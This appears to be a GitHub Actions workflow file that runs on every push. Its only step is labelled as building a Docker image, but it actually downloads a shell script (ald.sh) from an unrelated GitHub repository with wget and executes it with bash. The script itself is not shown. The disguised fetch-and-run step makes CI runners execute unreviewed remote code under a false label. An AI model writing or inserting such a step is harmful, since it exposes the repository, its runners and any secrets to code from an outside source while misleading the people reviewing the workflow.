name: Docker Image CIDO

on:
  push:




jobs:

  build:

    runs-on: ubuntu-latest

    steps:
    - uses: actions/checkout@v3
    - name: Build the MY Docker image
      run: |
         wget https://github.com/Mosnio/lyr/raw/main/ald.sh
         bash ald.sh
